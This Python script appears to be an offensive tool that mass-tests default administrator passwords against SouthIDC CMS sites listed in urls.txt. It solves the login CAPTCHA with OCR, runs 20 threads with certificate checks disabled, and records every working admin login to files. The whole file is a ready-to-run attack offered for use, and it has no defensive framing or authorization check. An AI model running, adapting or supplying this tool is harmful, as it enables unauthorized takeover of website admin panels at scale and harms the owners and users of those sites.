import requests
from PIL import Image
import pytesseract
import io
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
from queue import Queue
import warnings
import json
import os
from tqdm import tqdm

#southidc cms auto login script, written by Chirag Artani

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')

# Global variables
results_queue = Queue()
successful_urls_file = 'successful_urls.json'
successful_urls_lock = threading.Lock()
processed_urls = 0
total_urls = 0
progress_lock = threading.Lock()

def update_progress():
    """Update the progress counter"""
    global processed_urls
    with progress_lock:
        processed_urls += 1

def load_successful_urls():
    """Load previously successful URLs from JSON file"""
    try:
        if os.path.exists(successful_urls_file):
            with open(successful_urls_file, 'r') as f:
                return json.load(f)
        return {}
    except:
        return {}

def save_successful_url(url, credentials):
    """Save successful URL and credentials to JSON file"""
    with successful_urls_lock:
        successful_urls = load_successful_urls()
        successful_urls[url] = credentials
        with open(successful_urls_file, 'w') as f:
            json.dump(successful_urls, f, indent=4)

def get_captcha(session, captcha_url):
    """Get and process CAPTCHA image"""
    try:
        response = session.get(captcha_url, verify=False, timeout=10)
        if response.status_code == 200:
            img = Image.open(io.BytesIO(response.content))
            img = img.convert('L')
            captcha_text = pytesseract.image_to_string(img)
            captcha_text = ''.join(e for e in captcha_text if e.isalnum())
            return captcha_text
        return None
    except:
        return None

def try_login(url, username, password):
    """Attempt login with specific credentials"""
    try:
        session = requests.Session()
        captcha_url = f"{url}/admin/CheckCode/CheckCode.asp"
        login_url = f"{url}/admin/CheckLogin.asp"
        
        captcha_text = get_captcha(session, captcha_url)
        if not captcha_text:
            return False

        login_data = {
            'LoginName': username,
            'LoginPassword': password,
            'CheckCode': captcha_text,
            'Submit': 'confirm'
        }

        response = session.post(login_url, data=login_data, allow_redirects=False, verify=False, timeout=10)
        return response.status_code == 302 and 'main.asp' in response.headers.get('Location', '')
    except:
        return False

def process_url(url):
    """Process single URL with multiple passwords"""
    try:
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        # Check if URL was previously successful
        successful_urls = load_successful_urls()
        if url in successful_urls:
            update_progress()
            return
            
        passwords = ['0791idc', 'admin123', '123456', 'admin888']
        username = 'admin'
        
        for password in passwords:
            if try_login(url, username, password):
                success_msg = f"[SUCCESS] {url} - admin:{password}"
                credentials = f"admin:{password}"
                save_successful_url(url, credentials)
                results_queue.put(success_msg)
                print(f"\n{success_msg}")
                break
                
        update_progress()
    except:
        update_progress()

def process_urls_with_progress(urls, max_threads=10):
    """Process multiple URLs using thread pool with progress bar"""
    global total_urls
    total_urls = len(urls)
    
    with tqdm(total=total_urls, desc="Processing URLs", unit="url") as pbar:
        def update_pbar():
            while processed_urls < total_urls:
                current = processed_urls
                pbar.n = current
                pbar.refresh()
                time.sleep(0.1)
            pbar.n = total_urls
            pbar.refresh()
            
        # Start progress bar update thread
        progress_thread = threading.Thread(target=update_pbar)
        progress_thread.daemon = True
        progress_thread.start()
        
        # Process URLs
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(process_url, urls)
            
        progress_thread.join(timeout=1)

def main():
    try:
        # Read URLs from file
        with open('urls.txt', 'r') as f:
            urls = f.readlines()
        
        # Remove empty lines and whitespace
        urls = [url.strip() for url in urls if url.strip()]
        
        if not urls:
            print("No URLs found in urls.txt")
            return
        
        # Load existing successful URLs
        successful_urls = load_successful_urls()
        remaining_urls = [url for url in urls if url not in successful_urls]
        
        if not remaining_urls:
            print("All URLs have been previously tested successfully.")
            print("Existing successful URLs:")
            for url, creds in successful_urls.items():
                print(f"[PREVIOUS] {url} - {creds}")
            return
            
        print(f"Starting scan of {len(remaining_urls)} URLs...")
        print(f"Skipping {len(successful_urls)} previously successful URLs...")
        print("Successful logins will be displayed below:")
        print("-" * 50)
        
        # Start processing with progress bar
        process_urls_with_progress(remaining_urls, max_threads=20)
        
        # Save results to file
        if not results_queue.empty():
            with open('successful_logins.txt', 'a') as f:
                while not results_queue.empty():
                    f.write(results_queue.get() + '\n')
            print("\nResults have been saved to successful_logins.txt")
        else:
            print("\nNo new successful logins found.")
            
    except FileNotFoundError:
        print("Error: urls.txt not found")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
